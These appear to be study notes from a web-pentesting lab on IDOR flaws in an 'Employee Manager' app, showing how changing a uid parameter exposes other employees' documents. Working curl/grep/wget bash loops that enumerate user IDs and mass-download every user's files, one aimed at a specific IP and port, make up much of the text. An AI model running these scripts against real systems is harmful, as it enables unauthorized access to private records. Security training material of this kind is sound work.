## Insecure Parameters
* The exercise below is an `Employee Manager` web application that hosts employee records

![](web_attacks_idor_employee_manager.jpg)

* Application assumes user is logged in as employee with user id `uid=1`
* `/documents.php`:

![](web_attacks_idor_documents.jpg)

* On the documents page we see different documents which can be files uploaded by our user

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

* Files have predictable naming pattern
	* User `uid` and the month/year
	* `static file IDOR`
* Page is setting the `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`)
* If application uses this `uid` GET parameter as a direct reference to the employee records
	* We may be able to view other employees' documents by simply changing this value
	* If the back-end end of the web application `does` have a proper access control system, we will get some form of `Access Denied`
	* However, given that the web application passes as our `uid` in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records
* Try changing the `uid` to `?uid=2`
	* We don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents

![](web_attacks_idor_documents.jpg)

* However, `we must be attentive to the page details during any web pentest` and always keep an eye on the source code and page size
* If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with `uid=2`

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

## Mass Enumeration
* We can try manually accessing other employee documents with `uid=3`, `uid=4`
* We can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

* We see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line

```sh
$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

* Trim the extra parts and only get the document links in the output
	* Better practice to use Regex pattern that matches strings between `/document` and `.pdf`

```sh
$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

* Simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.(pdf|txt)"); do
                wget -q $url/$link
        done
done
```

* Modified for post requests

```bash
#!/bin/bash

url="http://178.128.42.34:31087"


for i in {1..20}; do
        for link in $(curl -s -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?.(pdf|txt)"); do
                wget -q $url/$link
        done
done
```